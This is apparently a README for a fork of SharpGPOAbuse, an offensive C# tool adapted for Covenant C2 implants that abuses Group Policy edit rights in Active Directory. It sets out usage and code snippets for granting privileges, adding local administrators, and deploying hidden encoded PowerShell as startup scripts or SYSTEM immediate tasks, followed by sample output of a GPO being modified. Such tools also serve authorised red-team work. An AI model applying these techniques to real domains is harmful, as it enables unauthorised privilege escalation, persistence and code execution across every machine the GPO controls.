# SharpGPOAbuse

SharpGPOAbuse is a .NET application written in C# that can be used to take advantage of a user's edit rights on a Group Policy Object (GPO) in order to compromise the objects that are controlled by that GPO.

More details can be found at the following blog post: [https://labs.f-secure.com/tools/sharpgpoabuse](https://labs.f-secure.com/tools/sharpgpoabuse)

This fork provides some modifications for use with Covenant's Grunts. The most notable changes are removing the `Environment.Exit()` calls that will kill a Grunt (since they do not create sacrificial processes for post-ex jobs) and removing the dependency for CommandLineParser.

## Compile Instructions

SharpGPOAbuse has been built against .NET 3.5 and is compatible with Visual Studio 2017 & 2019. Simply open the solution file and build the project.

## Usage

```
SharpGPOAbuse (Friendly Fork)
  AddNewRights:
    SharpGPOAbuse.exe AddNewRights [GPOName] [UserAccount] [UserRights CSV]
  NewLocalAdmin:");
    SharpGPOAbuse.exe NewLocalAdmin [GPOName] [UserAccount]
  NewStartupScript:");
    SharpGPOAbuse.exe NewStartupScript [GPOName] [UserAccount] [ScriptContent]
  NewImmediateTask:");
    SharpGPOAbuse.exe NewImmediateTask [GPOName] [Author] [TaskName] [CommandPath] [Arguments]
```

## Attacks Types

Currently SharpGPOAbuse supports the following options:

| Option                                                            | Description                          |
| ----------------------------------------------------------------- | ------------------------------------ |
| [AddUserRights](#adding-user-rights)                              | Add rights to a user                 |
| [AddLocalAdmin](#adding-a-local-admin)                            | Add a user to the local admins group |
| [AddComputerScript](#configuring-a-user-or-computer-logon-script) | Add a new computer startup script    |
| [AddUserScript](#configuring-a-user-or-computer-logon-script)     | Configure a user logon script        |
| [AddComputerTask](#configuring-a-computer-or-user-immediate-task) | Configure a computer immediate task  |
| [AddUserTask](#configuring-a-computer-or-user-immediate-task)     | Add an immediate task to a user      |

## Attack Options

### Adding User Rights

```c#
string[] UserRights = { "", "" };
string UserAccount = "";
string GPOName = "";

UserRightAssignment.AddNewRights(DomainName, DomainController, GPOName, DistinguishedName, UserRights, UserAccount);
```

`UserRights` can be any of the following:

```
SeTrustedCredManAccessPrivilege, SeNetworkLogonRight, SeTcbPrivilege, SeMachineAccountPrivilege, SeIncreaseQuotaPrivilege, SeInteractiveLogonRight, SeRemoteInteractiveLogonRight, SeBackupPrivilege, SeChangeNotifyPrivilege, SeSystemtimePrivilege, SeTimeZonePrivilege, SeCreatePagefilePrivilege, SeCreateTokenPrivilege, SeCreateGlobalPrivilege, SeCreatePermanentPrivilege, SeCreateSymbolicLinkPrivilege, SeDebugPrivilege, SeDenyNetworkLogonRight, SeDenyBatchLogonRight, SeDenyServiceLogonRight, SeDenyInteractiveLogonRight, SeDenyRemoteInteractiveLogonRight, SeEnableDelegationPrivilege, SeRemoteShutdownPrivilege, SeAuditPrivilege, SeImpersonatePrivilege, SeIncreaseWorkingSetPrivilege, SeIncreaseBasePriorityPrivilege, SeLoadDriverPrivilege, SeLockMemoryPrivilege, SeBatchLogonRight, SeServiceLogonRight, SeSecurityPrivilege, SeRelabelPrivilege, SeSystemEnvironmentPrivilege, SeManageVolumePrivilege, SeProfileSingleProcessPrivilege, SeSystemProfilePrivilege, SeUndockPrivilege, SeAssignPrimaryTokenPrivilege, SeRestorePrivilege, SeShutdownPrivilege, SeSyncAgentPrivilege, SeTakeOwnershipPrivilege
```

### Adding a Local Admin

```c#
string UserAccount = "";
string GPOName = "";

LocalAdmin.NewLocalAdmin(UserAccount, DomainName, DomainController, GPOName, DistinguishedName, false);
```

### Configuring a User or Computer Logon Script

```c#
string ScriptName = "Startup.bat";
string ScriptContent = "powershell.exe -Sta -Nop -Window Hidden -EncodedCommand <>";
string GPOName = "";

StartupScript.NewStartupScript(ScriptName, ScriptContent, DomainName, DomainController, GPOName, DistinguishedName, "User");
```

### Configuring a Computer or User Immediate Task

```c#
string TaskName = "";
string Author = "NT AUTHORITY\\SYSTEM";
string Command = "powershell.exe";
string Arguments = "-Sta -Nop -Window Hidden -EncodedCommand <>";
string GPOName = "";

ScheduledTask.NewImmediateTask(DomainName, DomainController, GPOName, DistinguishedName, TaskName, Author, Arguments, Command, false, "Computer");
```

## Example Output

```
[+] Domain = prod.zeropointsecurity.local
[+] Domain Controller = tf-win-dc02.prod.zeropointsecurity.local
[+] Distinguished Name = CN=Policies,CN=System,DC=prod,DC=zeropointsecurity,DC=local
[+] GUID of Server Baseline is: {205F0E03-17C3-4E9B-925E-330FAD565CA1}
[+] Creating new startup script...
[+] versionNumber attribute changed successfully
[+] The version number in GPT.ini was increased successfully.
[+] The GPO was modified to include a new startup script. Wait for the GPO refresh cycle.
[+] Done!
```
